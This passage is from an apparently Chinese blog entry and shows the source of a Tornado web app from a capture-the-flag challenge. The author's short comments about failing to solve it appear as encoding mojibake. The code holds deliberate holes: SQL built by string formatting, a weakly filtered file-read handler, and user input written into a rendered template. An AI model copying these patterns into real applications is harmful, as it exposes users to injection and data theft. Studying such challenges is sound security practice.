class="line">            self.render(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        conn = pymysql.connect(<span class="string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="string">&#x27;qwb&#x27;</span>)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;%s&#x27;&quot;</span> % username)</span><br><span class="line">            results = cursor.fetchall()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) != <span class="number">0</span>:</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`this username had been used`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                conn.commit()</span><br><span class="line">                conn.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.commit()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&#x27;insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)&#x27;</span>, [username, password])</span><br><span class="line">            conn.commit()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&quot;&lt;script&gt;alert(`success`);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.rollback()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogoutHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.clear_all_cookies()</span><br><span class="line">        self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user != <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/index.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.render(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        image_name = self.get_argument(<span class="string">&#x27;qwb_image_name&#x27;</span>, <span class="string">&#x27;header.jpeg&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> image_name:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user != <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> image_name.endswith(<span class="string">&#x27;.py&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> image_name <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> image_name:</span><br><span class="line">                self.finish(<span class="string">&quot;nonono, you can&#x27;t read it.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            image_name = os.path.join(os.getcwd() + <span class="string">&#x27;/image&#x27;</span>, image_name)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(image_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                img = f.read()</span><br><span class="line">            self.set_header(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">            self.finish(img)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecretHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tornado.web.RequestHandler._template_loaders):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line"></span><br><span class="line">        msg = self.get_argument(<span class="string">&#x27;congratulations&#x27;</span>, <span class="string">&#x27;oh! you find it&#x27;</span>)</span><br><span class="line">        bans = []</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> msg:</span><br><span class="line">                self.finish(<span class="string">&#x27;bad hack,go out!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;congratulations.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">            f.write(<span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)</span><br><span class="line">            f.flush()</span><br><span class="line">        self.render(<span class="string">&#x27;congratulations.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_app</span>():</span></span><br><span class="line">    <span class="keyword">return</span> tornado.web.Application([</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/index.php&#x27;</span>, MainHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/login.php&#x27;</span>, LoginHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/logout.php&#x27;</span>, LogoutHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/register.php&#x27;</span>, RegisterHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/admin.php&#x27;</span>, AdminHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/qwbimage.php&#x27;</span>, ImageHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/good_job_my_ctfer.php&#x27;</span>, SecretHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/&#x27;</span>, MainHandler)], **settings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = make_app()</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br><span class="line">    print(<span class="string">&#x27;start&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>å¤ªè¿·æƒ‘äº†ã€‚ã€‚æˆ‘è¯»ä¸å‡ºæ¥ä¸œè¥¿</p>
<p><img src="image-20210625173437381.png" alt="image-20210625173437381"></p>
<p><img src="image-20210625173452887.png" alt="image-20210625173452887"></p>
<p><img src="image-20210625173501193.png" alt="image-20210625173501193"></p>
<p>è¢«è¿™é¢˜æŠ˜è…¾äº†ä¸€å¤©äº†ï¼Œå®åœ¨æ˜¯å¿ƒçƒ¦æ„ä¹±æ²¡æœ‰å¿ƒæƒ…ç»§ç»­äº†ã€‚æ‘¸äº†ï¼</p>
]]></content>
      <tags>
        <tag>MYSQL</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
</search>
